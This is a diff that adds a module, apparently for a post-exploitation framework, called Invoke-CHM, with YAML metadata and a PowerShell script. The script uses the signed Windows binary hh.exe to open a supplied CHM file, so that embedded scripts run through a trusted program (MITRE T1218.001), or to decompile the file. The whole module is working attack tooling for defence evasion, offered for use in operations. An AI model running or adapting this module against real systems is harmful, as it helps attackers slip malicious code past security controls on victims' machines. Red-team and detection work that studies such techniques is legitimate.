@@ -1,0 +1,92 @@
+name: Invoke-CHM
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Use hh.exe to execute or decompile Compiled HTML Help (CHM) files
+  for signed binary proxy execution. CHM files can contain embedded
+  scripts and ActiveX controls that execute when opened with hh.exe.
+  Adversaries abuse this to proxy execution of malicious code through
+  a trusted Microsoft binary. This module supports both executing a
+  CHM file directly and decompiling it to extract its contents.
+software: ''
+tactics: [TA0005]
+techniques: [T1218.001]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: ChmPath
+    description: Path to the CHM file to execute or decompile.
+    required: true
+    value: ''
+  - name: InfoType
+    description: Action to perform on the CHM file.
+    required: true
+    value: 'execute'
+    strict: true
+    suggested_values:
+      - execute
+      - decompile
+  - name: DecompilePath
+    description: Output directory for decompiled CHM contents.
+    required: false
+    value: '$env:TEMP'
+    depends_on:
+      - name: InfoType
+        values: ['decompile']
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Invoke-CHM {
+      param(
+          [string]$ChmPath,
+          [string]$InfoType,
+          [string]$DecompilePath
+      )
+
+      $DecompilePath = $ExecutionContext.InvokeCommand.ExpandString($DecompilePath)
+
+      if (-not (Test-Path $ChmPath)) {
+          Write-Output "[-] CHM file not found at: $ChmPath"
+          return
+      }
+
+      if ($InfoType -eq "execute") {
+          Write-Output "[*] Executing CHM file via hh.exe: $ChmPath"
+          try {
+              $proc = Start-Process -FilePath "hh.exe" -ArgumentList "`"$ChmPath`"" -PassThru -ErrorAction Stop
+              Write-Output "[+] CHM execution initiated (PID: $($proc.Id))."
+          } catch {
+              Write-Output "[-] Failed to launch hh.exe: $($_.Exception.Message)"
+          }
+      }
+      elseif ($InfoType -eq "decompile") {
+          Write-Output "[*] Decompiling CHM file to: $DecompilePath"
+          try {
+              $proc = Start-Process -FilePath "hh.exe" `
+                  -ArgumentList "-decompile", "`"$DecompilePath`"", "`"$ChmPath`"" `
+                  -Wait -PassThru -ErrorAction Stop
+              if ($proc.ExitCode -ne 0) {
+                  Write-Output "[-] Decompile failed with exit code: $($proc.ExitCode)"
+              } else {
+                  Write-Output "[+] Decompile completed."
+                  Get-ChildItem -Path $DecompilePath -Recurse | Select-Object FullName
+              }
+          } catch {
+              Write-Output "[-] Failed to launch hh.exe for decompile: $($_.Exception.Message)"
+          }
+      }
+  }
+script_end: Invoke-CHM {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
